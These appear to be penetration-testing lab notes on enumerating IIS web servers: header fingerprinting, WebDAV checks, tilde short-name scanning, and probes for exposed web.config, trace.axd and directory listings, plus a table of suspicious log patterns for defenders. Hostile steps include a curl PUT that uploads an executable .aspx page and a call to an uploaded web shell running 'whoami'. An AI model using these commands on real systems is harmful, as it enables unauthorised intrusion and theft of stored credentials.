### IIS Enumeration

#### 1. Version detection
The fastest way to fingerprint IIS is to read the response headers. IIS includes a `Server` header in every response that identifies the product and version

```bash
curl -I http://10.113.180.147

...
Server: Microsoft-IIS/10.0
X-Powered-By: ASP.NET
...
```

The `Server` header gives you the IIS version. `X-Powered-By: ASP.NET` confirms .NET application hosting. `X-AspNet-Version` gives you the .NET framework version, which can reveal additional CVEs.

#### 2. WebDAV
**WebDAV (Web Distributed Authoring and Versioning)** - HTTP extension that adds file management verbs: `PUT` (upload), `DELETE`, `COPY`, `MOVE`, `PROPFIND`, and `LOCK`. When left enabled on a directory with write and script execute permissions, it becomes a direct path to uploading an executable shell.

check if active:
```bash
curl -X OPTIONS http://10.113.180.147 -sv 2>&1 | grep -E "Allow:|DAV:"
```

test upload files and their execution (returns HTTP status codes):
```bash
curl -s -o /dev/null -w "PUT aspx: %{http_code}\n" -X PUT --data '<%@ Page Language=Jscript%><%Response.Write(1+1)%>' http://10.113.180.147/webdav/test.aspx
```

>A `200` with output means the server executed it; a 200 with your raw file content means it was served statically

#### 3. Conclusion

|Pattern|Normal|Suspicious|
|---|---|---|
|HTTP methods|`GET`, `POST`, `HEAD`|`OPTIONS` returning `DAV:` header; `PUT`, `MOVE`, `PROPFIND`|
|URI paths|`.htm`, `.aspx`, `.js`, `.css`, static assets|Paths containing `~`; newly appeared `.aspx` files in writable directories|
|Status codes|200, 304, 301, 302, 404|201 Created (file uploaded via PUT); unexpected PUT or DELETE in logs|
|`Server` header|Present, matches expected version|Suppressed or reveals EOL version like `IIS/6.0`|

### IIS Tilde Enumeration

If a backup file or hidden admin directory exists on the server, this technique will surface it.

#### 1. How it works

The conversion rule is predictable:
- Take the first 6 characters of the long name
- Append `~1` (or `~2`, `~3` if there is a collision)
- Keep the first 3 characters of the extension

![iis2.png](screenshots/iis2.png)

When IIS receives a request with a `~` character in the path, it processes it against the 8.3 short name namespace. The critical behaviour is that IIS responds differently depending on whether the tilde path matches a real short name or not. 

> affects IIS 5.x through IIS 10.0, including current versions on Server 2022

#### 2. Scan

Scan code: https://github.com/lijiejie/IIS_shortname_Scanner/blob/master/iis_shortname_scan.py

Usage:
```bash
python3 iis_shortname_scan.py http://10.113.180.147/
```

The tool works left to right: it first confirms single-character prefixes (`/a~1.*`, `/b~1.*`), then extends each match letter by letter until it has the full short name

#### 3. Enumerating the Discovered Directory

The short name `backup~1` tells you that the directory name starts with `backup`.  Rest you have to guess:

```bash
curl http://10.113.180.147/BackupFiles/
```

reveals files in that folder:
```text
4/25/2026 11:04 AM 91 <A HREF="/BackupFiles/webdav_notes.txt">webdav_notes.txt</A><br></pre><hr></body></html>
```

get file:
```bash
curl http://10.113.180.147/BackupFiles/webdav_notes.txt
```

Three things must all be true simultaneously:

1. **WebDAV is enabled** on the target directory
2. **Valid credentials** with **Write permission** on the WebDAV directory 
3. **Script Execute is set**, IIS passes `.aspx` requests to the ASP.NET handler rather than serving them as static content

### IIS Misconfigurations

#### 1. Directory Listing Enabled

When IIS has no default document configured for a directory (no `index.html`, no `default.aspx`), and the `Directory Browsing` feature is enabled in IIS Manager. 

Exposes contents of web directories. Backup files, configuration exports, uploaded user content, and source code backups become visible and downloadable without any authentication.

Check:
```bash
curl http://10.113.180.147/uploads/
```

#### 2. HTTP PUT and DELETE Without Authentication

```bash
curl -X OPTIONS http://10.113.180.147/ -sv 2>&1 | grep "Allow:"
```

If the `Allow:` header includes `PUT` or `DELETE` without any authentication requirement, unauthenticated file upload is possible

#### 3. web.config Exposure

`web.config` is the ASP.NET application configuration file. It contains database connection strings, API keys, SMTP credentials, encryption keys, and application settings.

```bash
curl http://10.113.180.147/web.config
```

#### 4. trace.axd Left Enabled

When enabled, visiting `http://target/trace.axd` returns the application trace log for recent requests

```bash
curl http://10.113.180.147/trace.axd
```

A `200` response confirming the trace viewer is accessible

#### 5. TRACE Method Enabled

Can enable Cross-Site Tracing (XST) attacks. See if enabled:
```bash
curl -X TRACE http://10.113.180.147 -sv
```

#### 6. Application Pool Running as a Privileged Account

Check AppPool:
```bash
curl "http://10.113.180.147/webdav/cmd.aspx?cmd=whoami"
```

### NMAP

Nmap do nearly everything automatically:

version scan:
```bash
nmap -sV -p 80 10.113.180.147
```

OPTIONS request:
```bash
nmap --script http-methods -p 80 10.113.180.147
```

Detect WebDAV:
```bash
nmap --script http-webdav-scan -p 80 10.113.180.147
```

Identifying Authentication Requirements:
```bash
nmap --script http-ntlm-info --script-args http-ntlm-info.root=/webdav/ -p 80 10.113.180.147
```
